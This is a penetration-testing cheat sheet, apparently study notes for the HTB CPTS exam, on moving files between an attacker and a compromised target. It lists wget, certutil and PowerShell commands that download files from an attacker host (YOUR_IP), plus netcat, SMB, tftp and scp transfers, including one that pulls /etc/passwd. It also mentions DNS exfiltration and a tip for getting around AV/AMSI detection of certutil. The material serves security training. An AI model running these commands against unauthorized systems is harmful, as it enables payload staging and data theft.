# 09 — File Transfers Cheat Sheet

## From Attacker → Linux Target

```bash
# HTTP server on attacker
python3 -m http.server 8000

# On target
wget http://YOUR_IP:8000/file
curl http://YOUR_IP:8000/file -o file
```

## From Attacker → Windows Target

```powershell
# PowerShell download
certutil.exe -urlcache -f http://YOUR_IP:8000/file.exe file.exe
powershell -c "Invoke-WebRequest -Uri http://YOUR_IP:8000/file.exe -OutFile file.exe"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://YOUR_IP:8000/file.exe','file.exe')"

# iwr shorthand
iwr -uri http://YOUR_IP:8000/file.exe -outfile file.exe
```

## SMB Transfer (works well for Windows, no HTTP needed)

```bash
# Attacker: serve a share
impacket-smbserver share . -smb2support

# Victim (Windows)
copy \\YOUR_IP\share\file.exe file.exe
```

## SCP / SSH (when creds available)

```bash
scp file user@target:/tmp/
scp user@target:/etc/passwd .
```

## Netcat File Transfer (no HTTP/SMB available)

```bash
# Receiver
nc -lvnp PORT > file

# Sender
nc <IP> PORT < file
```

## Base64 (small files, copy-paste through limited shells)

```bash
# On attacker
base64 -w0 file > file.b64

# On target, paste content then:
base64 -d file.b64 > file
```

## FTP / TFTP

```bash
# tftp (common on Windows targets, no auth needed if server up)
tftp -i YOUR_IP GET file.exe
```

## Exfiltrating Data Out (DNS/ICMP when everything else is firewalled)

```bash
# DNS exfil with dnscat2 or simple dig chunks (advanced/rare in CPTS)
```

## Quick Reference — Tools In This File

| Task | HTB-taught | Faster/better alternative |
|---|---|---|
| Windows file transfer | certutil | PowerShell `Invoke-WebRequest`/`iwr` is more reliable when certutil is flagged by AV/AMSI |
| Serving files quickly | python http.server | works fine — no need to overthink this one |
| Windows share-based transfer | manual net use | `impacket-smbserver` — zero-config anonymous share |

Next: `10-linux-privesc.md`
